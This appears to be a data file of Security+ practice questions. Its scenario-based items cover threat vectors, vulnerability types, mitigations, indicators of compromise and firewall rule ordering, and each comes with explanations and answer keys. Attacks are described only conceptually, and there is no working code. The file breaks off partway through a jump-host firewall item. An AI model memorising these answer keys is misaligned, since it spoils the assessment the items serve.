        "explanation": "Risky behavior is a deliberate action the user knows weakens security: editing the hosts file to get around the web filter, or disabling endpoint protection so an unapproved tool will install. Unexpected behavior breaks from the account's normal pattern: a sign-in from another country at 03:00, or a 40 GB download by someone who normally pulls a few files a day. Unintentional behavior is an honest mistake: mistyping the company domain and landing on a lookalike site, or leaving a USB drive on a train.",
        "payload": {
          "items": [
            {
              "id": "typo",
              "label": "Mistypes the company's domain name and enters credentials on a lookalike site"
            },
            {
              "id": "hosts",
              "label": "Edits the hosts file on their laptop to get around the web filter"
            },
            {
              "id": "abroad",
              "label": "A payroll clerk's account signs in from another country at 03:00"
            },
            {
              "id": "usb",
              "label": "Leaves a USB drive holding project files on a train"
            },
            {
              "id": "edr",
              "label": "Disables the endpoint protection agent so an unapproved tool will install"
            },
            {
              "id": "bulk",
              "label": "A user who normally downloads a few files a day pulls 40 GB from the file server"
            }
          ],
          "buckets": [
            {
              "id": "risky",
              "label": "Risky"
            },
            {
              "id": "unexpected",
              "label": "Unexpected"
            },
            {
              "id": "unintentional",
              "label": "Unintentional"
            }
          ]
        },
        "answer": {
          "map": {
            "hosts": "risky",
            "edr": "risky",
            "abroad": "unexpected",
            "bulk": "unexpected",
            "typo": "unintentional",
            "usb": "unintentional"
          }
        }
      }
    ]
  },

  {
    "id": "sp-gv-06",
    "cert": "secplus",
    "objective": "5.4",
    "topic": "Consequences of non-compliance",
    "title": "The cost of failing the audit",
    "estMinutes": 4,
    "scenario": "An audit finds that a pharmacy chain stored payment card and patient records unencrypted for three years. Legal counsel lists five outcomes the company now faces and asks you to label each one for the board report.",
    "steps": [
      {
        "id": "s1",
        "type": "match",
        "points": 1,
        "prompt": "Pair each consequence of non-compliance with the outcome that represents it.",
        "explanation": "A fine is a monetary penalty, such as a regulator charging a percentage of annual turnover. A sanction is a penalty imposed by a regulator or government; fines and license loss are forms of it, but the item that is neither a payment nor a lost permit is the restriction: the ban on launching new online services until the fix is verified. Loss of license means losing the permit the business needs in order to operate, such as a pharmacy board revoking its operating permits. Reputational damage is lost trust, shown by customers moving to competitors after the news coverage. A contractual impact comes from an agreement with another party, like a partner using a breach clause to end its contract.",
        "payload": {
          "left": [
            {
              "id": "fines",
              "label": "Fines"
            },
            {
              "id": "sanctions",
              "label": "Sanctions"
            },
            {
              "id": "license",
              "label": "Loss of license"
            },
            {
              "id": "reputation",
              "label": "Reputational damage"
            },
            {
              "id": "contract",
              "label": "Contractual impacts"
            }
          ],
          "right": [
            {
              "id": "dcustomers",
              "label": "Customers move their prescriptions to competitors after the story makes national news"
            },
            {
              "id": "dpenalty",
              "label": "The data-protection regulator orders a payment of 4% of annual turnover"
            },
            {
              "id": "dpartner",
              "label": "A hospital partner invokes a clause in its agreement and ends the supply deal"
            },
            {
              "id": "drestrict",
              "label": "The regulator bars the company from launching any new online services until the fix is verified"
            },
            {
              "id": "dpermit",
              "label": "The state pharmacy board revokes the permits the company needs to run its pharmacies"
            }
          ]
        },
        "answer": {
          "pairs": {
            "fines": "dpenalty",
            "sanctions": "drestrict",
            "license": "dpermit",
            "reputation": "dcustomers",
            "contract": "dpartner"
          }
        }
      }
    ]
  },

  {
    "id": "sp-th-01",
    "cert": "secplus",
    "objective": "2.2",
    "topic": "Threat vectors",
    "title": "Trace how each attack got in",
    "estMinutes": 5,
    "scenario": "A retailer's SOC is closing out six incidents from the past month. For the quarterly threat report, each one needs tagging with the threat vector that delivered it.",
    "steps": [
      {
        "id": "s1",
        "type": "configure",
        "points": 1,
        "prompt": "Choose the threat vector for each incident.",
        "explanation": "Message-based vectors arrive by email, SMS or instant message, like the parcel text. Image-based vectors hide code inside an image: an SVG is written in XML, so it can carry JavaScript that runs when the portal renders it inline or someone opens it directly. An SVG is also a file, but Sec+ lists image-based as its own vector with SVG as the textbook case; file-based here means documents and archives. File-based vectors use documents and archives, like the macro-enabled document from the file-sharing site. A voice call (vishing) is the caller posing as the bank's fraud team. Removable devices include the USB drives left in the car park. A supply chain vector reaches the target through a trusted third party, here the compromised MSP's remote-management tool. None of the six relied on an unsecure network or an open service port.",
        "payload": {
          "slots": [
            {
              "id": "parcel",
              "label": "Staff get an SMS saying a parcel is held at the depot, with a link to pay a redelivery fee",
              "options": [
                {
                  "id": "msg",
                  "text": "Message-based"
                },
                {
                  "id": "img",
                  "text": "Image-based"
                },
                {
                  "id": "file",
                  "text": "File-based"
                },
                {
                  "id": "voice",
                  "text": "Voice call"
                },
                {
                  "id": "usb",
                  "text": "Removable device"
                },
                {
                  "id": "supply",
                  "text": "Supply chain"
                },
                {
                  "id": "net",
                  "text": "Unsecure network"
                },
                {
                  "id": "port",
                  "text": "Open service port"
                }
              ]
            },
            {
              "id": "svg",
              "label": "A customer's profile picture on the support portal is an SVG carrying JavaScript that runs when staff view the profile",
              "options": [
                {
                  "id": "msg",
                  "text": "Message-based"
                },
                {
                  "id": "img",
                  "text": "Image-based"
                },
                {
                  "id": "file",
                  "text": "File-based"
                },
                {
                  "id": "voice",
                  "text": "Voice call"
                },
                {
                  "id": "usb",
                  "text": "Removable device"
                },
                {
                  "id": "supply",
                  "text": "Supply chain"
                },
                {
                  "id": "net",
                  "text": "Unsecure network"
                },
                {
                  "id": "port",
                  "text": "Open service port"
                }
              ]
            },
            {
              "id": "macro",
              "label": "An Office document on a public file-sharing site downloads malware through a macro once staff allow macros to run",
              "options": [
                {
                  "id": "msg",
                  "text": "Message-based"
                },
                {
                  "id": "img",
                  "text": "Image-based"
                },
                {
                  "id": "file",
                  "text": "File-based"
                },
                {
                  "id": "voice",
                  "text": "Voice call"
                },
                {
                  "id": "usb",
                  "text": "Removable device"
                },
                {
                  "id": "supply",
                  "text": "Supply chain"
                },
                {
                  "id": "net",
                  "text": "Unsecure network"
                },
                {
                  "id": "port",
                  "text": "Open service port"
                }
              ]
            },
            {
              "id": "caller",
              "label": "Someone posing as the bank's fraud team phones a finance clerk and asks them to read back a one-time code",
              "options": [
                {
                  "id": "msg",
                  "text": "Message-based"
                },
                {
                  "id": "img",
                  "text": "Image-based"
                },
                {
                  "id": "file",
                  "text": "File-based"
                },
                {
                  "id": "voice",
                  "text": "Voice call"
                },
                {
                  "id": "usb",
                  "text": "Removable device"
                },
                {
                  "id": "supply",
                  "text": "Supply chain"
                },
                {
                  "id": "net",
                  "text": "Unsecure network"
                },
                {
                  "id": "port",
                  "text": "Open service port"
                }
              ]
            },
            {
              "id": "carpark",
              "label": "Flash drives labeled \"Salary review 2026\" are found scattered across the staff car park",
              "options": [
                {
                  "id": "msg",
                  "text": "Message-based"
                },
                {
                  "id": "img",
                  "text": "Image-based"
                },
                {
                  "id": "file",
                  "text": "File-based"
                },
                {
                  "id": "voice",
                  "text": "Voice call"
                },
                {
                  "id": "usb",
                  "text": "Removable device"
                },
                {
                  "id": "supply",
                  "text": "Supply chain"
                },
                {
                  "id": "net",
                  "text": "Unsecure network"
                },
                {
                  "id": "port",
                  "text": "Open service port"
                }
              ]
            },
            {
              "id": "msp",
              "label": "Attackers breach the retailer's managed service provider and push ransomware through the MSP's remote-management tool",
              "options": [
                {
                  "id": "msg",
                  "text": "Message-based"
                },
                {
                  "id": "img",
                  "text": "Image-based"
                },
                {
                  "id": "file",
                  "text": "File-based"
                },
                {
                  "id": "voice",
                  "text": "Voice call"
                },
                {
                  "id": "usb",
                  "text": "Removable device"
                },
                {
                  "id": "supply",
                  "text": "Supply chain"
                },
                {
                  "id": "net",
                  "text": "Unsecure network"
                },
                {
                  "id": "port",
                  "text": "Open service port"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "parcel": "msg",
            "svg": "img",
            "macro": "file",
            "caller": "voice",
            "carpark": "usb",
            "msp": "supply"
          }
        }
      }
    ]
  },

  {
    "id": "sp-th-02",
    "cert": "secplus",
    "objective": "2.3",
    "topic": "Vulnerability types",
    "title": "Tag the quarter's findings",
    "estMinutes": 4,
    "scenario": "A managed hosting firm's security team is writing up six findings from the last quarter, spread across its virtualization platform, staff phones and endpoints. The risk report needs each finding tagged with its vulnerability type.",
    "steps": [
      {
        "id": "s1",
        "type": "match",
        "points": 1,
        "prompt": "Pair each vulnerability type with the finding it explains.",
        "explanation": "VM escape is code breaking out of a guest VM to reach the hypervisor and other guests. Resource reuse is when memory or storage passes to a new tenant without being cleared, so the previous tenant's data is still there. Side loading installs an app from outside the official store, like the APK from a forum. Jailbreaking removes the manufacturer's restrictions on an iOS device to gain root-level control of the OS. Memory injection places malicious code into the memory of a running, legitimate process so it runs under that process's identity. A malicious update arrives through the normal, trusted update channel after the vendor's build system is compromised.",
        "payload": {
          "left": [
            {
              "id": "vmescape",
              "label": "VM escape"
            },
            {
              "id": "reuse",
              "label": "Resource reuse"
            },
            {
              "id": "sideload",
              "label": "Side loading"
            },
            {
              "id": "jailbreak",
              "label": "Jailbreaking"
            },
            {
              "id": "meminject",
              "label": "Memory injection"
            },
            {
              "id": "malupdate",
              "label": "Malicious update"
            }
          ],
          "right": [
            {
              "id": "dsigned",
              "label": "A routine, digitally signed vendor update installed a backdoor after attackers compromised the vendor's build system"
            },
            {
              "id": "dleftover",
              "label": "A newly provisioned VM's disk still held another customer's database files because the storage was reallocated without being wiped"
            },
            {
              "id": "dprocess",
              "label": "Malware wrote its code into the memory of a running, trusted process so it executed under that process's identity"
            },
            {
              "id": "dapk",
              "label": "A sales rep installed a free copy of a paid app on an Android phone from an APK posted on a forum"
            },
            {
              "id": "dbreakout",
              "label": "Code running inside one tenant's virtual machine reached the hypervisor and read another tenant's VM"
            },
            {
              "id": "droot",
              "label": "An executive removed the manufacturer's built-in restrictions on their iPhone to gain root-level control of the OS"
            }
          ]
        },
        "answer": {
          "pairs": {
            "vmescape": "dbreakout",
            "reuse": "dleftover",
            "sideload": "dapk",
            "jailbreak": "droot",
            "meminject": "dprocess",
            "malupdate": "dsigned"
          }
        }
      }
    ]
  },

  {
    "id": "sp-th-03",
    "cert": "secplus",
    "objective": "2.5",
    "topic": "Mitigation techniques",
    "title": "Close the assessment findings",
    "estMinutes": 4,
    "scenario": "A regional hospital's security assessment flagged six exposures, and the CISO wants one mitigation technique assigned to each before the board meets. Pick the technique that most directly fixes each exposure.",
    "steps": [
      {
        "id": "s1",
        "type": "match",
        "points": 1,
        "prompt": "Pair each mitigation technique with the exposure it most directly addresses.",
        "explanation": "Segmentation splits the flat network so building IoT devices and clinical workstations sit in separate zones. Isolation cuts one compromised system off from everything else while it stays powered on for forensics. Access control (ACLs and permissions) limits the HR share to the people who need it. Monitoring means someone actually reviews the logs, which would have caught the stolen admin account within hours, not weeks. Configuration enforcement checks each device against the approved baseline (patch level, EDR agent, firewall) before it is allowed on the network. Decommissioning retires the old file server properly: wipe or destroy its drives and remove it from the network.",
        "payload": {
          "left": [
            {
              "id": "segment",
              "label": "Segmentation"
            },
            {
              "id": "isolate",
              "label": "Isolation"
            },
            {
              "id": "access",
              "label": "Access control (ACLs and permissions)"
            },
            {
              "id": "monitor",
              "label": "Monitoring"
            },
            {
              "id": "config",
              "label": "Configuration enforcement"
            },
            {
              "id": "decom",
              "label": "Decommissioning"
            }
          ],
          "right": [
            {
              "id": "dretired",
              "label": "A retired file server holding old patient records is still powered on and reachable in the server room"
            },
            {
              "id": "dhrshare",
              "label": "Every employee can open the HR share that holds salary and disciplinary records"
            },
            {
              "id": "dflat",
              "label": "Smart thermostats, badge readers and clinical workstations all share one flat network"
            },
            {
              "id": "dbaseline",
              "label": "Laptops join the network with no check that their patch level, EDR agent and firewall settings match the approved baseline"
            },
            {
              "id": "dlogs",
              "label": "Authentication logs are collected but never reviewed, so a stolen admin account went unnoticed for six weeks"
            },
            {
              "id": "dencrypting",
              "label": "A nurse's workstation is encrypting files right now and must be cut off from everything, but kept powered on for forensics"
            }
          ]
        },
        "answer": {
          "pairs": {
            "segment": "dflat",
            "isolate": "dencrypting",
            "access": "dhrshare",
            "monitor": "dlogs",
            "config": "dbaseline",
            "decom": "dretired"
          }
        }
      }
    ]
  },

  {
    "id": "sp-th-04",
    "cert": "secplus",
    "objective": "2.4",
    "topic": "Indicators of malicious activity",
    "title": "Triage the overnight queue",
    "estMinutes": 5,
    "scenario": "You are the first analyst in at a SOC, and eight observations from the overnight shift are waiting in the queue. Before escalating, tag each one with the indicator of malicious activity it shows.",
    "steps": [
      {
        "id": "s1",
        "type": "configure",
        "points": 1,
        "prompt": "Choose the indicator each observation represents.",
        "explanation": "Impossible travel: two sign-ins too far apart, in too little time, to be one person (Leeds, then Singapore 30 minutes later). Concurrent session usage: one account active in two places at the same moment. Account lockout: repeated failed attempts locked the account while its owner was not trying, which points to a brute-force attack on that one account (password spraying is built to stay under the lockout threshold, so it rarely causes one). Missing logs: a gap with no entries while the server was running suggests someone cleared them. Out-of-cycle logging: patch and firewall changes recorded outside any approved window. Published/documented: the company's own data turning up online. Resource consumption: CPU and outbound traffic spiking for no business reason. Resource inaccessibility: files that suddenly cannot be opened, here renamed by ransomware. No observation shows blocked content.",
        "payload": {
          "slots": [
            {
              "id": "travel",
              "label": "jdoe signs in from Leeds at 09:05, signs out at 09:20, then signs in from Singapore at 09:50",
              "options": [
                {
                  "id": "lockout",
                  "text": "Account lockout"
                },
                {
                  "id": "concurrent",
                  "text": "Concurrent session usage"
                },
                {
                  "id": "blocked",
                  "text": "Blocked content"
                },
                {
                  "id": "travel",
                  "text": "Impossible travel"
                },
                {
                  "id": "consume",
                  "text": "Resource consumption"
                },
                {
                  "id": "inaccess",
                  "text": "Resource inaccessibility"
                },
                {
                  "id": "outcycle",
                  "text": "Out-of-cycle logging"
                },
                {
                  "id": "published",
                  "text": "Published/documented"
                },
                {
                  "id": "missing",
                  "text": "Missing logs"
                }
              ]
            },
            {
              "id": "twoplaces",
              "label": "An admin account is signed in on the admin's desk PC and, at the same moment, on a finance server the admin never uses",
              "options": [
                {
                  "id": "lockout",
                  "text": "Account lockout"
                },
                {
                  "id": "concurrent",
                  "text": "Concurrent session usage"
                },
                {
                  "id": "blocked",
                  "text": "Blocked content"
                },
                {
                  "id": "travel",
                  "text": "Impossible travel"
                },
                {
                  "id": "consume",
                  "text": "Resource consumption"
                },
                {
                  "id": "inaccess",
                  "text": "Resource inaccessibility"
                },
                {
                  "id": "outcycle",
                  "text": "Out-of-cycle logging"
                },
                {
                  "id": "published",
                  "text": "Published/documented"
                },
                {
                  "id": "missing",
                  "text": "Missing logs"
                }
              ]
            },
            {
              "id": "helpdesk",
              "label": "A user calls the help desk: sign-in fails with \"too many failed attempts\", though they have not tried to sign in since yesterday",
              "options": [
                {
                  "id": "lockout",
                  "text": "Account lockout"
                },
                {
                  "id": "concurrent",
                  "text": "Concurrent session usage"
                },
                {
                  "id": "blocked",
                  "text": "Blocked content"
                },
                {
                  "id": "travel",
                  "text": "Impossible travel"
                },
                {
                  "id": "consume",
                  "text": "Resource consumption"
                },
                {
                  "id": "inaccess",
                  "text": "Resource inaccessibility"
                },
                {
                  "id": "outcycle",
                  "text": "Out-of-cycle logging"
                },
                {
                  "id": "published",
                  "text": "Published/documented"
                },
                {
                  "id": "missing",
                  "text": "Missing logs"
                }
              ]
            },
            {
              "id": "gap",
              "label": "The domain controller's security log has no entries at all between 01:00 and 03:30, although the server was running",
              "options": [
                {
                  "id": "lockout",
                  "text": "Account lockout"
                },
                {
                  "id": "concurrent",
                  "text": "Concurrent session usage"
                },
                {
                  "id": "blocked",
                  "text": "Blocked content"
                },
                {
                  "id": "travel",
                  "text": "Impossible travel"
                },
                {
                  "id": "consume",
                  "text": "Resource consumption"
                },
                {
                  "id": "inaccess",
                  "text": "Resource inaccessibility"
                },
                {
                  "id": "outcycle",
                  "text": "Out-of-cycle logging"
                },
                {
                  "id": "published",
                  "text": "Published/documented"
                },
                {
                  "id": "missing",
                  "text": "Missing logs"
                }
              ]
            },
            {
              "id": "sunday",
              "label": "Patch-installation and firewall-change entries appear at 02:00 on a Sunday, outside any approved change window",
              "options": [
                {
                  "id": "lockout",
                  "text": "Account lockout"
                },
                {
                  "id": "concurrent",
                  "text": "Concurrent session usage"
                },
                {
                  "id": "blocked",
                  "text": "Blocked content"
                },
                {
                  "id": "travel",
                  "text": "Impossible travel"
                },
                {
                  "id": "consume",
                  "text": "Resource consumption"
                },
                {
                  "id": "inaccess",
                  "text": "Resource inaccessibility"
                },
                {
                  "id": "outcycle",
                  "text": "Out-of-cycle logging"
                },
                {
                  "id": "published",
                  "text": "Published/documented"
                },
                {
                  "id": "missing",
                  "text": "Missing logs"
                }
              ]
            },
            {
              "id": "forsale",
              "label": "A file containing the company's customer list is offered for sale on a dark-web forum",
              "options": [
                {
                  "id": "lockout",
                  "text": "Account lockout"
                },
                {
                  "id": "concurrent",
                  "text": "Concurrent session usage"
                },
                {
                  "id": "blocked",
                  "text": "Blocked content"
                },
                {
                  "id": "travel",
                  "text": "Impossible travel"
                },
                {
                  "id": "consume",
                  "text": "Resource consumption"
                },
                {
                  "id": "inaccess",
                  "text": "Resource inaccessibility"
                },
                {
                  "id": "outcycle",
                  "text": "Out-of-cycle logging"
                },
                {
                  "id": "published",
                  "text": "Published/documented"
                },
                {
                  "id": "missing",
                  "text": "Missing logs"
                }
              ]
            },
            {
              "id": "cpu",
              "label": "A reception PC's CPU sat at 100% all night while its outbound traffic was twenty times its normal level",
              "options": [
                {
                  "id": "lockout",
                  "text": "Account lockout"
                },
                {
                  "id": "concurrent",
                  "text": "Concurrent session usage"
                },
                {
                  "id": "blocked",
                  "text": "Blocked content"
                },
                {
                  "id": "travel",
                  "text": "Impossible travel"
                },
                {
                  "id": "consume",
                  "text": "Resource consumption"
                },
                {
                  "id": "inaccess",
                  "text": "Resource inaccessibility"
                },
                {
                  "id": "outcycle",
                  "text": "Out-of-cycle logging"
                },
                {
                  "id": "published",
                  "text": "Published/documented"
                },
                {
                  "id": "missing",
                  "text": "Missing logs"
                }
              ]
            },
            {
              "id": "share",
              "label": "Staff can no longer open anything on the shared drive, and every filename now ends in .crypt",
              "options": [
                {
                  "id": "lockout",
                  "text": "Account lockout"
                },
                {
                  "id": "concurrent",
                  "text": "Concurrent session usage"
                },
                {
                  "id": "blocked",
                  "text": "Blocked content"
                },
                {
                  "id": "travel",
                  "text": "Impossible travel"
                },
                {
                  "id": "consume",
                  "text": "Resource consumption"
                },
                {
                  "id": "inaccess",
                  "text": "Resource inaccessibility"
                },
                {
                  "id": "outcycle",
                  "text": "Out-of-cycle logging"
                },
                {
                  "id": "published",
                  "text": "Published/documented"
                },
                {
                  "id": "missing",
                  "text": "Missing logs"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "travel": "travel",
            "twoplaces": "concurrent",
            "helpdesk": "lockout",
            "gap": "missing",
            "sunday": "outcycle",
            "forsale": "published",
            "cpu": "consume",
            "share": "inaccess"
          }
        }
      }
    ]
  },

  // ===== v8.158.0 — firewall-rule PBQs (firewall), SY0-701 3.2 4.5; two-reviewer gate passed 2026-10-11 =====
  {
    "id": "sp-fw-01",
    "cert": "secplus",
    "objective": "4.5",
    "topic": "Screened subnet",
    "title": "Publish the storefront from a screened subnet",
    "estMinutes": 5,
    "archetype": "firewall",
    "scenario": "Harbor & Vine is moving its online store off the internal network and into a screened subnet (172.16.10.0/24) on a three-legged firewall. The storefront web server is 172.16.10.20, and the search node it queries, 172.16.10.30, sits beside it in the same subnet. Staff work on the internal LAN (10.20.0.0/16). The change ticket, in the order the web team wrote it: no other connection may be opened into the screened subnet, from anywhere; staff keep their normal outbound access; customers anywhere on the internet reach the storefront over HTTPS; anything else is dropped. Staff use the storefront the same way customers do. Screened-subnet servers are patched over a separate out-of-band network, so they never start connections of their own. The firewall is stateful, so replies to an allowed connection come back automatically.",
    "assets": {
      "reference": {
        "kind": "network",
        "given": {
          "site": "Harbor & Vine · FW-EDGE",
          "engine": "first match wins, implicit deny"
        },
        "devices": [
          {
            "id": "net",
            "label": "Internet",
            "type": "cloud",
            "zone": "untrusted",
            "ip": "any",
            "x": 0,
            "y": 1
          },
          {
            "id": "fw",
            "label": "FW-EDGE",
            "type": "firewall",
            "ip": "top-down",
            "x": 2,
            "y": 1
          },
          {
            "id": "search",
            "label": "Search node",
            "type": "server",
            "zone": "screened subnet",
            "ip": "172.16.10.30",
            "x": 3,
            "y": 0
          },
          {
            "id": "web",
            "label": "Storefront web",
            "type": "server",
            "zone": "screened subnet",
            "ip": "172.16.10.20",
            "x": 4,
            "y": 0
          },
          {
            "id": "lan",
            "label": "Staff LAN",
            "type": "pc",
            "zone": "internal",
            "ip": "10.20.0.0/16",
            "x": 4,
            "y": 2
          }
        ],
        "links": [
          {
            "from": "net",
            "to": "fw"
          },
          {
            "from": "fw",
            "to": "web"
          },
          {
            "from": "fw",
            "to": "search"
          },
          {
            "from": "fw",
            "to": "lan"
          }
        ]
      }
    },
    "fwSpec": {
      "rules": [
        {
          "id": "web",
          "action": "allow",
          "proto": "tcp",
          "src": "any",
          "dst": "172.16.10.20/32",
          "port": 443
        },
        {
          "id": "dmz",
          "action": "deny",
          "proto": "any",
          "src": "any",
          "dst": "172.16.10.0/24",
          "port": "any"
        },
        {
          "id": "staff",
          "action": "allow",
          "proto": "any",
          "src": "10.20.0.0/16",
          "dst": "any",
          "port": "any"
        },
        {
          "id": "deny",
          "action": "deny",
          "proto": "any",
          "src": "any",
          "dst": "any",
          "port": "any"
        }
      ],
      "flows": [
        {
          "name": "internet https to the storefront",
          "proto": "tcp",
          "src": "203.0.113.40",
          "dst": "172.16.10.20",
          "port": 443,
          "expect": "allow"
        },
        {
          "name": "internet ssh to the storefront blocked",
          "proto": "tcp",
          "src": "203.0.113.40",
          "dst": "172.16.10.20",
          "port": 22,
          "expect": "deny"
        },
        {
          "name": "staff https to the storefront",
          "proto": "tcp",
          "src": "10.20.4.15",
          "dst": "172.16.10.20",
          "port": 443,
          "expect": "allow"
        },
        {
          "name": "staff ssh into the screened subnet blocked",
          "proto": "tcp",
          "src": "10.20.4.15",
          "dst": "172.16.10.20",
          "port": 22,
          "expect": "deny"
        },
        {
          "name": "staff to the search node blocked",
          "proto": "tcp",
          "src": "10.20.4.15",
          "dst": "172.16.10.30",
          "port": 443,
          "expect": "deny"
        },
        {
          "name": "internet to the search node blocked",
          "proto": "tcp",
          "src": "203.0.113.40",
          "dst": "172.16.10.30",
          "port": 443,
          "expect": "deny"
        },
        {
          "name": "staff browse the web",
          "proto": "tcp",
          "src": "10.20.4.15",
          "dst": "198.51.100.80",
          "port": 443,
          "expect": "allow"
        },
        {
          "name": "storefront to the LAN blocked",
          "proto": "tcp",
          "src": "172.16.10.20",
          "dst": "10.20.4.15",
          "port": 445,
          "expect": "deny"
        },
        {
          "name": "internet to the LAN blocked",
          "proto": "tcp",
          "src": "203.0.113.40",
          "dst": "10.20.4.15",
          "port": 3389,
          "expect": "deny"
        }
      ],
      "shadowTable": {
        "rules": [
          {
            "id": "web",
            "action": "allow",
            "proto": "tcp",
            "src": "any",
            "dst": "172.16.10.20/32",
            "port": 443
          },
          {
            "id": "dmz",
            "action": "deny",
            "proto": "any",
            "src": "any",
            "dst": "172.16.10.0/24",
            "port": "any"
          },
          {
            "id": "anyOut",
            "action": "allow",
            "proto": "any",
            "src": "any",
            "dst": "any",
            "port": "any"
          },
          {
            "id": "deny",
            "action": "deny",
            "proto": "any",
            "src": "any",
            "dst": "any",
            "port": "any"
          }
        ],
        "shadowedRuleId": "deny"
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "configure",
        "points": 1,
        "prompt": "Build the rule that publishes the storefront to the internet.",
        "explanation": "Publish one host on one port: any source to 172.16.10.20/32 on TCP 443. Publishing the whole 172.16.10.0/24 would expose the search node too, along with every server that lands there later, which breaks least privilege. TCP 80 is plain HTTP, and TCP 8443 is an alternate HTTPS port the storefront does not listen on.",
        "payload": {
          "slots": [
            {
              "id": "action",
              "label": "Action",
              "options": [
                {
                  "id": "a",
                  "text": "allow"
                },
                {
                  "id": "d",
                  "text": "deny"
                }
              ]
            },
            {
              "id": "dst",
              "label": "Destination",
              "options": [
                {
                  "id": "any",
                  "text": "any"
                },
                {
                  "id": "dmz",
                  "text": "172.16.10.0/24"
                },
                {
                  "id": "web",
                  "text": "172.16.10.20/32"
                }
              ]
            },
            {
              "id": "svc",
              "label": "Service",
              "options": [
                {
                  "id": "http",
                  "text": "TCP 80"
                },
                {
                  "id": "https",
                  "text": "TCP 443"
                },
                {
                  "id": "alt",
                  "text": "TCP 8443"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "action": "a",
            "dst": "web",
            "svc": "https"
          }
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "prompt": "Build the rule that closes the rest of the screened subnet.",
        "explanation": "Deny any source to the whole 172.16.10.0/24 on any service. A /32 destination would close the storefront host but leave the search node open to staff through their outbound rule. Denying a single port, 443 or 22, leaves every other port reachable the same way.",
        "payload": {
          "slots": [
            {
              "id": "action",
              "label": "Action",
              "options": [
                {
                  "id": "a",
                  "text": "allow"
                },
                {
                  "id": "d",
                  "text": "deny"
                }
              ]
            },
            {
              "id": "dst",
              "label": "Destination",
              "options": [
                {
                  "id": "web",
                  "text": "172.16.10.20/32"
                },
                {
                  "id": "dmz",
                  "text": "172.16.10.0/24"
                },
                {
                  "id": "lan",
                  "text": "10.20.0.0/16"
                }
              ]
            },
            {
              "id": "svc",
              "label": "Service",
              "options": [
                {
                  "id": "https",
                  "text": "TCP 443"
                },
                {
                  "id": "ssh",
                  "text": "TCP 22"
                },
                {
                  "id": "any",
                  "text": "any"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "action": "d",
            "dst": "dmz",
            "svc": "any"
          }
        }
      },
      {
        "id": "s3",
        "type": "order",
        "points": 1,
        "prompt": "Arrange the four rules. The firewall reads from the top and stops at the first match.",
        "explanation": "Storefront allow, screened-subnet block, staff outbound, then the catch-all. The storefront rule is an exception to the block, so it has to sit above it or customers get dropped. The block has to sit above the staff rule: staff traffic into the screened subnet matches both, and the ticket only lets staff use the storefront over HTTPS. The catch-all goes last, because nothing below it can ever be reached.",
        "payload": {
          "items": [
            {
              "id": "staff",
              "label": "Allow staff their normal outbound access"
            },
            {
              "id": "deny",
              "label": "Drop everything else"
            },
            {
              "id": "web",
              "label": "Allow the internet to reach the storefront over HTTPS"
            },
            {
              "id": "dmz",
              "label": "Block every other connection into the screened subnet"
            }
          ]
        },
        "answer": {
          "correctOrder": [
            "web",
            "dmz",
            "staff",
            "deny"
          ]
        }
      },
      {
        "id": "s4",
        "type": "analyze",
        "points": 1,
        "prompt": "A month later, an audit exports the live table, top rule first. Which rule can never fire?",
        "explanation": "Rule 4 never fires. Someone changed rule 3’s source from the staff LAN to Any, so rule 3 now matches every packet that gets past rules 1 and 2, and the catch-all under it is never reached. Rule 3 is the cause, but it fires all day, so it is not the answer. Rule 2 still fires for everything else aimed at the screened subnet. The damage is serious: nothing gets dropped any more, so unsolicited traffic from the internet passes, and a compromised storefront can open connections into the LAN. Fix: set rule 3’s source back to 10.20.0.0/16.",
        "payload": {
          "multi": false,
          "lines": [
            {
              "id": "l1",
              "text": "1 · Allow · Any → Storefront web · HTTPS"
            },
            {
              "id": "l2",
              "text": "2 · Deny · Any → Screened subnet · any service"
            },
            {
              "id": "l3",
              "text": "3 · Allow · Any → Any · any service"
            },
            {
              "id": "l4",
              "text": "4 · Deny · Any → Any · any service"
            }
          ]
        },
        "answer": {
          "selected": [
            "l4"
          ]
        }
      }
    ]
  },

  {
    "id": "sp-fw-02",
    "cert": "secplus",
    "objective": "3.2",
    "topic": "Jump server",
    "title": "Lock the management network behind a jump host",
    "estMinutes": 5,
    "archetype": "firewall",
    "scenario": "At Orbit Freight, the management network (10.50.99.0/24) holds the management interfaces of every switch and hypervisor. Admins manage them over SSH, and the devices’ web consoles are switched on too. The core firewall routes between the VLANs and out to the internet. The new policy: corporate users (10.50.0.0/16) keep their normal access to everything else; nobody on the corporate network may reach the management network, and that includes the IT team’s own workstations in the IT admin VLAN (10.50.10.0/24); the only way in is SSH from the hardened jump host at 10.50.10.5, which enforces MFA and records every session. Anything else is dropped.",
    "assets": {
      "reference": {
        "kind": "network",
        "given": {
          "site": "Orbit Freight · FW-CORE",
          "engine": "first match wins, implicit deny"
        },
        "devices": [
          {
            "id": "jump",
            "label": "Jump host",
            "type": "pc",
            "zone": "it admin",
            "ip": "10.50.10.5",
            "x": 0,
            "y": 0
          },
          {
            "id": "itv",
            "label": "IT admin VLAN",
            "type": "pc",
            "zone": "it admin",
            "ip": "10.50.10.0/24",
            "x": 1,
            "y": 0
          },
          {
            "id": "staff",
            "label": "Staff VLAN",
            "type": "pc",
            "zone": "staff",
            "ip": "10.50.20.0/24",
            "x": 0,
            "y": 2
          },
          {
            "id": "fw",
            "label": "FW-CORE",
            "type": "firewall",
            "ip": "top-down",
            "x": 2,
            "y": 1
          },
          {
            "id": "mgmt",
            "label": "Mgmt network",
            "type": "switch",
            "zone": "management",
            "ip": "10.50.99.0/24",
            "x": 4,
            "y": 0
          },
          {
            "id": "net",
            "label": "Internet",
            "type": "cloud",
            "ip": "any",
            "x": 4,
            "y": 2
          }
        ],
        "links": [
          {
            "from": "jump",
            "to": "fw"
          },
          {
            "from": "itv",
            "to": "fw"
          },
          {
            "from": "staff",
            "to": "fw"
          },
          {
            "from": "fw",
            "to": "mgmt"
          },
          {
            "from": "fw",
            "to": "net"
          }
        ]
      }
    },
    "fwSpec": {
      "rules": [
        {
          "id": "jump",
          "action": "allow",
          "proto": "tcp",
          "src": "10.50.10.5/32",
          "dst": "10.50.99.0/24",
          "port": 22
        },
        {
          "id": "noMgmt",
          "action": "deny",
          "proto": "any",
          "src": "10.50.0.0/16",
          "dst": "10.50.99.0/24",
          "port": "any"
        },
        {
          "id": "corp",
          "action": "allow",
